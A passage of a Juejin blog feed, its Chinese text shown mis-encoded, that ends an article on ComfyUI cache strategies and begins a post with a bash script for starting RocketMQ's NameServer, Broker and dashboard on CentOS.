       <span class="hljs-variable language_">self</span>.timestamps[<span class="hljs-variable language_">self</span>.cache_key_set.get_data_key(node_id)] = time.time()
       <span class="hljs-keyword">return</span> <span class="hljs-variable language_">super</span>().get(node_id)
</code></pre>
<p>åœ¨ oom_score ä¸€æ ·æ—¶ï¼Œtimestamp èµ·åˆ°â€œæœ€è¿‘è®¿é—®ä¼˜å…ˆä¿ç•™â€çš„ä½œç”¨ã€‚</p>
<h2 data-id="heading-26">7.3 æç¤ºç»‘å®šä¸‹çš„è¡Œä¸ºï¼šä¸æ¸…ç† outputs</h2>
<p>RAM æ¨¡å¼ä¸‹ï¼Œclean_unused() çš„è¡Œä¸ºä¸ CLASSIC ä¸åŒï¼ˆè§å‚è€ƒè¯´æ˜ï¼‰ï¼š</p>
<ul>
<li>RAM æ¨¡å¼ï¼š clean_unused() åªåšå­ç¼“å­˜åˆ†åŒºæ¸…ç†ï¼Œä¸ä¼šåˆ æ‰â€œå½“å‰ prompt æœªä½¿ç”¨â€çš„ outputs æ¡ç›®ï¼›</li>
<li>CLASSIC æ¨¡å¼ï¼š clean_unused() ä¼šåŒæ—¶åˆ æ‰å½“å‰ prompt æœªç”¨åˆ°çš„ outputs æ¡ç›®ã€‚</li>
</ul>
<p>ç»“æœæ˜¯ï¼š</p>
<ul>
<li>RAM æ¨¡å¼å¯ä»¥è·¨å¤šä¸ª workflow é•¿æ—¶é—´ä¿ç•™ä¸­é—´ç»“æœï¼›</li>
<li>åªæœ‰åœ¨ RAM ä¸å¤Ÿæ—¶æ‰åšæ¸…é€€ã€‚</li>
</ul>
<h2 data-id="heading-27">7.4 å®¹å™¨ç¯å¢ƒä¸‹éœ€è¦æ³¨æ„çš„ç‚¹</h2>
<p>çš„ AutoDL ä¸­ï¼Œç”¨ psutil.virtual_memory().availableï¼Œåœ¨å®¹å™¨é‡Œçœ‹åˆ°çš„æ˜¯å®¿ä¸»æœºå†…å­˜ï¼Œè€Œä¸æ˜¯å®¹å™¨çš„é™é¢ï¼Œå¯¼è‡´æ°¸è¿œâ€œä¸è§¦å‘å›æ”¶â€ï¼Œæœ€å OOMã€‚</p>
<p>é€‚ç”¨åœºæ™¯ï¼š</p>
<ul>
<li>å¤š workflow / å¤šæ¨¡å‹ / å¤š LoRA åŒæ—¶å­˜åœ¨ï¼Œä¸”å¸Œæœ›å°½å¯èƒ½é•¿æ—¶é—´å¤ç”¨è¾“å‡ºç»“æœï¼›</li>
<li>æœºå™¨å†…å­˜æœ‰é™ï¼Œä½†æ›´å…³å¿ƒâ€œä¸ OOMâ€ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå›ºå®šçš„ max_sizeï¼›</li>
<li>ç‰¹åˆ«é€‚åˆå®¹å™¨ç¯å¢ƒï¼ˆK8s / AutoDL ç­‰ï¼‰ï¼Œé…åˆ --cache-ram ã€‚</li>
</ul>
<h2 data-id="heading-28">8. ä¸€äº›è½åœ°å»ºè®®</h2>
<p>æœ€åï¼Œç”¨ä¸€æ®µæ¯”è¾ƒç›´æ¥çš„å»ºè®®æ”¶å°¾ã€‚</p>
<h2 data-id="heading-29">8.1 å•æ¨¡å‹ / workflow ç¨³å®šï¼šç”¨ CLASSIC å³å¯</h2>
<p>ç‰¹ç‚¹ï¼š</p>
<ul>
<li>å·¥ä½œæµåŸºæœ¬ä¸æ¢ï¼›</li>
<li>ä¸»è¦å¸Œæœ›é¿å…ä¸€æ¬¡æ‰§è¡Œä¸­çš„é‡å¤è®¡ç®—ï¼ˆæ¯”å¦‚å¤šæ¬¡ previewï¼‰ã€‚</li>
</ul>
<p>ç”¨é»˜è®¤ CLASSICï¼š</p>
<ul>
<li>ç»“æ„ç®€å•ï¼›</li>
<li>ä¸å‚ä¸å¤æ‚çš„è·¨ prompt ä¿ç•™ï¼›</li>
<li>ä¸éœ€è¦æ‹…å¿ƒ LRU å°ºå¯¸å’Œ RAM é˜ˆå€¼è°ƒå‚ã€‚</li>
</ul>
<h2 data-id="heading-30">8.2 å¤š workflow + æ§åˆ¶ç¼“å­˜å°ºå¯¸ï¼šç”¨ LRU</h2>
<p>åœºæ™¯ï¼š</p>
<ul>
<li>æœ‰å¤šå¥— workflowï¼Œåœ¨å®ƒä»¬ä¹‹é—´æ¥å›åˆ‡ï¼›</li>
<li>æœºå™¨å†…å­˜ä¸æ˜¯ç‰¹åˆ«å¤§ï¼Œå¸Œæœ› outputs ä¸è¦æ— é™è†¨èƒ€ï¼›</li>
<li>åˆå¸Œæœ›æŸäº›å¸¸ç”¨å­å›¾èƒ½è¢«å¤ç”¨ã€‚</li>
</ul>
<p>åšæ³•ï¼š</p>
<ul>
<li>å¯åŠ¨æ—¶åŠ  --cache-lru Nï¼ˆN å…ˆç»™ä¸€ä¸ªç›¸å¯¹ä¿å®ˆçš„å€¼ï¼Œæ¯”å¦‚å‡ ç™¾åˆ°å‡ åƒæ¡ï¼Œçœ‹å†…å­˜æ›²çº¿å†è°ƒï¼‰ï¼›</li>
<li>è®© LRUCache ç”¨ä»£é™… + max_size å¸®ä½ è‡ªåŠ¨åšâ€œè¿‘æœŸå¸¸ç”¨ä¿ç•™ã€æ—©æœŸå†·é—¨æ¸…ç†â€ã€‚</li>
</ul>
<h2 data-id="heading-31">8.3 å¤šæ¨¡å‹ / å¤š LoRA / å®¹å™¨ç¯å¢ƒï¼šä¼˜å…ˆ RAM_PRESSURE</h2>
<p>åœºæ™¯ï¼š</p>
<ul>
<li>å®¹å™¨ / äº‘å¹³å°ï¼ˆK8sã€AutoDL ç­‰ï¼‰ï¼›</li>
<li>æœ‰è¾ƒå¤šæ¨¡å‹ã€LoRA å’Œ workflow æ··ç”¨ï¼›</li>
<li>å†…å­˜è¢«å®¹å™¨é™åˆ¶ï¼Œå®¹æ˜“å› çˆ† RAM æ‰è¿› OOMã€‚</li>
</ul>
<p>åšæ³•ï¼š</p>
<ul>
<li>
<p>å¯åŠ¨æ—¶ç”¨ --cache-ram  é…ä¸€ä¸ªâ€œå¸Œæœ›ä¿ç•™çš„ RAM ä½™é‡â€ï¼›</p>
</li>
<li>
<p>æ¯”å¦‚å®¹å™¨ç»™äº† 32GBï¼Œå°±è®¾åœ¨ 16â€“24GB çœ‹æƒ…å†µï¼›</p>
</li>
<li>
<p>è®© RAMPressureCacheï¼š</p>
</li>
<li>
<p>æœ€å¤§ç¨‹åº¦ä¿ç•™å„ä¸ª workflow çš„ä¸­é—´ç»“æœï¼ˆåŒ…æ‹¬åº”ç”¨ LoRA åçš„æ¨¡å‹å¯¹è±¡ç­‰ï¼‰ï¼›</p>
</li>
<li>
<p>åœ¨å†…å­˜ä¸è¶³æ—¶ï¼Œæ ¹æ® OOM è¯„åˆ†ä¼˜å…ˆæ¸…æ—§ä»£ã€å¤§å†…å­˜æ¡ç›®ã€‚</p>
</li>
</ul>
<p>æ³¨æ„ä¸€ç‚¹ï¼šå³ä½¿æœ‰å®¹å™¨ä¼˜åŒ–ï¼Œå¦‚æœå¹³å°æœ¬èº«çš„ cgroup æŒ‚å¾—ä¸æ ‡å‡†ï¼Œ_ram_gb() çš„ç»“æœè¿˜æ˜¯æœ‰å¯èƒ½åç¦»å®é™…ï¼Œè¿™ä¸€ç‚¹è¦ç»“åˆå¹³å°æ–‡æ¡£ç¡®è®¤ã€‚</p>
<h2 data-id="heading-32">8.4 å®Œå…¨ä¸æƒ³æŠ˜è…¾ï¼šç›´æ¥å…³ç¼“å­˜</h2>
<p>å¦‚æœä½ ï¼š</p>
<ul>
<li>ç¯å¢ƒå—é™ï¼›</li>
<li>æˆ–è€…è°ƒè¯•é˜¶æ®µä¸æƒ³è¢«ç¼“å­˜å½±å“è¡Œä¸ºç†è§£ï¼›</li>
</ul>
<p>å¯ä»¥ç›´æ¥ç”¨ï¼š</p>
<ul>
<li>--cache-none å¯¹åº” CacheType.NONEï¼ŒCacheSet.init_null_cache() èµ° NullCacheï¼Œæ‰€æœ‰ get/set éƒ½æ˜¯ no-opã€‚</li>
</ul>
<p>ä»£ä»·å°±æ˜¯ï¼šæ¯æ¬¡æ‰§è¡Œéƒ½å®Œå…¨é‡æ–°ç®—ä¸€éã€‚</p>
<h2 data-id="heading-33">9. å°ç»“ä¸€ä¸‹</h2>
<p>æŠŠä¸Šé¢çš„å†…å®¹å‹ç¼©æˆå‡ å¥è¯ï¼š</p>
<ul>
<li>
<p>ComfyUI æœ‰ä¸¤è·¯ç¼“å­˜ï¼š</p>
</li>
<li>
<p>outputs å­˜ä¸­é—´ç»“æœï¼ŒçœŸæ­£ç”¨æ¥çœç®—åŠ›ï¼›</p>
</li>
<li>
<p>objects å­˜èŠ‚ç‚¹å®ä¾‹ï¼Œåªå‡å°‘ Python å¯¹è±¡æ„é€ å¼€é”€ã€‚</p>
</li>
<li>
<p>é”®ä½“ç³»ï¼š</p>
</li>
<li>
<p>è¾“å‡ºï¼šè¾“å…¥ç­¾å + is_changed æŒ‡çº¹ï¼ˆ+ æ¡ä»¶ä¸‹çš„ node_idï¼‰ï¼›</p>
</li>
<li>
<p>å¯¹è±¡ï¼š<strong>(node_id, class_type)</strong>ã€‚</p>
</li>
<li>
<p>å››ç§ç­–ç•¥ï¼š</p>
</li>
<li>
<p>CLASSICï¼šé»˜è®¤å±‚çº§ç¼“å­˜ï¼ŒæŒ‰å½“å‰ prompt é”®é›†åˆæ¸…ç†ï¼Œä¸åš LRU / RAM é©±é€ï¼›</p>
</li>
<li>
<p>LRUï¼šåªå¯¹ outputs åšä»£é™… LRUï¼Œé…åˆ max_size æ§åˆ¶å®¹é‡ï¼›</p>
</li>
<li>
<p>RAM_PRESSUREï¼šåœ¨ LRU åŸºç¡€ä¸ŠåŠ  RAM å‹åŠ›é©±é€ï¼Œåœ¨å†…å­˜ä¸è¶³æ—¶æŒ‰ OOM è¯„åˆ†æ¸…ç†ï¼›</p>
</li>
<li>
<p>NONEï¼šå½»åº•å…³æ‰ç¼“å­˜ã€‚</p>
</li>
<li>
<p>åœ¨å¤šæ¨¡å‹ / å¤š workflow / å¤š LoRA åœºæ™¯ä¸‹ï¼š</p>
</li>
<li>
<p>å¯¹è±¡ç¼“å­˜ objects å§‹ç»ˆæ˜¯å±‚çº§ç¼“å­˜ï¼Œä¸å‚ä¸ LRU / RAM é©±é€ï¼Œåœ¨æ¯æ¬¡ç»‘å®š prompt æ—¶æŒ‰é”®é›†åˆæ¸…ç†ï¼›</p>
</li>
<li>
<p>æ¨¡å‹æƒé‡ / LoRA çš„çœŸå®é©»ç•™ç”±æ¨¡å‹ç®¡ç†å±‚æ§åˆ¶ï¼›</p>
</li>
<li>
<p>çœŸæ­£è¦å…³å¿ƒçš„æ˜¯ï¼šå¦‚ä½•é€‰æ‹© outputs çš„ç­–ç•¥ï¼Œè®©ä¸­é—´ç»“æœæ—¢èƒ½æœ‰æ•ˆå¤ç”¨ï¼Œåˆä¸ä¼šæŠŠå†…å­˜æ‰“çˆ†ã€‚</p>
</li>
</ul>
<p>å¦‚æœæˆ‘ä»¬åœ¨ä¸€ä¸ªå¤æ‚çš„å·¥ä½œæµç¯å¢ƒé‡Œè·‘ ComfyUIï¼Œå»ºè®®å…ˆææ¸…æ¥šè‡ªå·±å¤„äºå“ªç§åœºæ™¯ï¼Œå†ç»“åˆä¸Šé¢çš„ç­–ç•¥é€‰é¡¹ï¼ŒæŠŠç¼“å­˜è°ƒæˆæˆ‘ä»¬èƒ½æ§åˆ¶çš„çŠ¶æ€ï¼Œè€Œä¸æ˜¯è®©å®ƒåœ¨åå°ã€Œè‡ªåŠ¨é•¿è‰ã€ã€‚</p>
<p>ä»¥ä¸Šã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[RocketMQä»å®æˆ˜åˆ°æºç ï¼šè‡ªåŠ¨å¯åŠ¨è„šæœ¬]]></title>    <link>https://juejin.cn/post/7597722671083831330</link>    <guid>https://juejin.cn/post/7597722671083831330</guid>    <pubDate>2026-01-22T04:14:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597722671083831330" data-draft-id="7597695487303499791" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="RocketMQä»å®æˆ˜åˆ°æºç ï¼šè‡ªåŠ¨å¯åŠ¨è„šæœ¬"/> <meta itemprop="keywords" content="åç«¯,RocketMQ,Shell"/> <meta itemprop="datePublished" content="2026-01-22T04:14:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ€’æ”¾å§å¾·å¾·"/> <meta itemprop="url" content="https://juejin.cn/user/2502950820787672"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            RocketMQä»å®æˆ˜åˆ°æºç ï¼šè‡ªåŠ¨å¯åŠ¨è„šæœ¬
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2502950820787672/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ€’æ”¾å§å¾·å¾·
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T04:14:31.000Z" title="Thu Jan 22 2026 04:14:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">RocketMQä»å®æˆ˜åˆ°æºç ï¼šRocketMQè‡ªåŠ¨å¯åŠ¨è„šæœ¬</h2>
<blockquote>
<p>ğŸ˜„ç”Ÿå‘½ä¸æ¯ï¼Œå†™ä½œä¸æ­¢</p>
<p>ğŸ”¥ ç»§ç»­è¸ä¸Šå­¦ä¹ ä¹‹è·¯ï¼Œå­¦ä¹‹åˆ†äº«ç¬”è®°</p>
<p>ğŸ‘Š æ€»æœ‰ä¸€å¤©æˆ‘ä¹Ÿèƒ½åƒå„ä½å¤§ä½¬ä¸€æ ·</p>
<p>ğŸ† <a href="https://juejin.cn/user/2502950820787672" target="_blank" title="https://juejin.cn/user/2502950820787672">åšå®¢é¦–é¡µ</a> Â Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cnblogs.com%2Flyd-code%2F" target="_blank" title="https://www.cnblogs.com/lyd-code/" ref="nofollow noopener noreferrer">@æ€’æ”¾å§å¾·å¾·</a>Â Â <a href="https://link.juejin.cn?target=https%3A%2F%2Flydandtry.github.io%2F" target="_blank" title="https://lydandtry.github.io/" ref="nofollow noopener noreferrer">Toè®°å½•é¢†åœ°</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_43843951%3Ftype%3Dblog" target="_blank" title="https://blog.csdn.net/qq_43843951?type=blog" ref="nofollow noopener noreferrer">@ä¸€ä¸ªæœ‰æ¢¦æœ‰æˆçš„äºº</a></p>
<p>ğŸŒåˆ†äº«å­¦ä¹ å¿ƒå¾—ï¼Œæ¬¢è¿æŒ‡æ­£ï¼Œå¤§å®¶ä¸€èµ·å­¦ä¹ æˆé•¿ï¼</p>
</blockquote>
<p><em>è½¬å‘è¯·æºå¸¦ä½œè€…ä¿¡æ¯</em>Â  <strong>@æ€’æ”¾å§å¾·å¾·(æ˜é‡‘) @ä¸€ä¸ªæœ‰æ¢¦æœ‰æˆçš„äºº(CSDN)</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c33ed4ee428469db4621f0d3f673b67~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769660071&amp;x-signature=1dTnhjBz0Ipau4PV0Xmr5vPphh0%3D" alt="rocketmqå°é¢.png" loading="lazy"/></p>
<h3 data-id="heading-1">å‰è¨€</h3>
<p>å› ä¸ºå­¦ä¹ çš„ RocketMQ æ˜¯æ”¾åˆ°æˆ‘è™šæ‹Ÿæœºçš„ï¼Œæ¯æ¬¡éƒ½è¦åˆ‡æ¢åˆ°å¯¹åº”çš„åŒ…è¿›è¡Œæ‰§è¡Œ 3 æ¬¡å‘½ä»¤æ¥å¯åŠ¨ <code>NameServer</code>å’Œ <code>Borker</code>ä»¥åŠ <code>dashboard</code>ï¼Œéå¸¸éº»çƒ¦ï¼Œæ‰€ä»¥å’¨è¯¢ AI åˆ›å»ºäº†ä»¥ä¸‹è„šæœ¬ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚</p>
<h3 data-id="heading-2">è„šæœ¬</h3>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªè‡ªåŠ¨å¯åŠ¨RocketMQæ‰€æœ‰ç»„ä»¶çš„Shellè„šæœ¬ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># RocketMQè‡ªåŠ¨å¯åŠ¨è„šæœ¬</span>
<span class="hljs-comment"># é€‚ç”¨äºCentOS 7ç³»ç»Ÿ</span>

<span class="hljs-comment"># è®¾ç½®é¢œè‰²è¾“å‡º</span>
RED=<span class="hljs-string">'\033[0;31m'</span>
GREEN=<span class="hljs-string">'\033[0;32m'</span>
YELLOW=<span class="hljs-string">'\033[1;33m'</span>
NC=<span class="hljs-string">'\033[0m'</span> <span class="hljs-comment"># No Color</span>

<span class="hljs-comment"># å®šä¹‰è·¯å¾„</span>
ROCKETMQ_BIN_DIR=<span class="hljs-string">"/usr/rocketmq/rocketmq-all-5.3.0-bin-release/bin"</span>
ROCKETMQ_HOME=<span class="hljs-string">"/usr/rocketmq"</span>
DASHBOARD_JAR=<span class="hljs-string">"rocketmq-dashboard-2.0.0.jar"</span>

<span class="hljs-comment"># æ£€æŸ¥ç›®å½•æ˜¯å¦å­˜åœ¨</span>
<span class="hljs-function"><span class="hljs-title">check_directories</span></span>() {
    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${YELLOW}</span>æ£€æŸ¥ç›®å½•æ˜¯å¦å­˜åœ¨...<span class="hljs-variable">${NC}</span>"</span>
    
    <span class="hljs-keyword">if</span> [ ! -d <span class="hljs-string">"<span class="hljs-variable">$ROCKETMQ_BIN_DIR</span>"</span> ]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${RED}</span>é”™è¯¯: RocketMQ binç›®å½•ä¸å­˜åœ¨: $ROCKETMQ_BIN_DIR<span class="hljs-variable">${NC}</span>"</span>
        <span class="hljs-built_in">exit</span> 1
    <span class="hljs-keyword">fi</span>
    
    <span class="hljs-keyword">if</span> [ ! -d <span class="hljs-string">"<span class="hljs-variable">$ROCKETMQ_HOME</span>"</span> ]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${RED}</span>é”™è¯¯: RocketMQä¸»ç›®å½•ä¸å­˜åœ¨: $ROCKETMQ_HOME<span class="hljs-variable">${NC}</span>"</span>
        <span class="hljs-built_in">exit</span> 1
    <span class="hljs-keyword">fi</span>
    
    <span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">"<span class="hljs-variable">$ROCKETMQ_HOME</span>/<span class="hljs-variable">$DASHBOARD_JAR</span>"</span> ]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${RED}</span>é”™è¯¯: Dashboard jaræ–‡ä»¶ä¸å­˜åœ¨: <span class="hljs-variable">$ROCKETMQ_HOME</span>/$DASHBOARD_JAR<span class="hljs-variable">${NC}</span>"</span>
        <span class="hljs-built_in">exit</span> 1
    <span class="hljs-keyword">fi</span>
    
    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${GREEN}</span>ç›®å½•æ£€æŸ¥é€šè¿‡âˆš<span class="hljs-variable">${NC}</span>"</span>
}

<span class="hljs-comment"># æ£€æŸ¥Javaç¯å¢ƒ</span>
<span class="hljs-function"><span class="hljs-title">check_java</span></span>() {
    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${YELLOW}</span>æ£€æŸ¥Javaç¯å¢ƒ...<span class="hljs-variable">${NC}</span>"</span>
    
    <span class="hljs-keyword">if</span> ! <span class="hljs-built_in">command</span> -v java &amp;&gt; /dev/null; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${RED}</span>é”™è¯¯: Javaæœªå®‰è£…æˆ–æœªåœ¨PATHä¸­<span class="hljs-variable">${NC}</span>"</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"è¯·å…ˆå®‰è£…Java: yum install java-1.8.0-openjdk"</span>
        <span class="hljs-built_in">exit</span> 1
    <span class="hljs-keyword">fi</span>
    
    java_version=$(java -version 2&gt;&amp;1 | <span class="hljs-built_in">head</span> -1 | <span class="hljs-built_in">cut</span> -d<span class="hljs-string">'"'</span> -f2)
    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${GREEN}</span>Javaç‰ˆæœ¬: $java_version<span class="hljs-variable">${NC}</span>"</span>
}

<span class="hljs-comment"># æ£€æŸ¥è¿›ç¨‹æ˜¯å¦å·²å­˜åœ¨</span>
<span class="hljs-function"><span class="hljs-title">check_process</span></span>() {
    <span class="hljs-built_in">local</span> process_name=<span class="hljs-variable">$1</span>
    <span class="hljs-built_in">local</span> pid=$(ps aux | grep <span class="hljs-string">"<span class="hljs-variable">$process_name</span>"</span> | grep -v grep | awk <span class="hljs-string">'{print $2}'</span>)
    <span class="hljs-keyword">if</span> [ -n <span class="hljs-string">"<span class="hljs-variable">$pid</span>"</span> ]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">return</span> 0  <span class="hljs-comment"># è¿›ç¨‹å­˜åœ¨</span>
    <span class="hljs-keyword">else</span>
        <span class="hljs-built_in">return</span> 1  <span class="hljs-comment"># è¿›ç¨‹ä¸å­˜åœ¨</span>
    <span class="hljs-keyword">fi</span>
}

<span class="hljs-comment"># å¯åŠ¨NameServer</span>
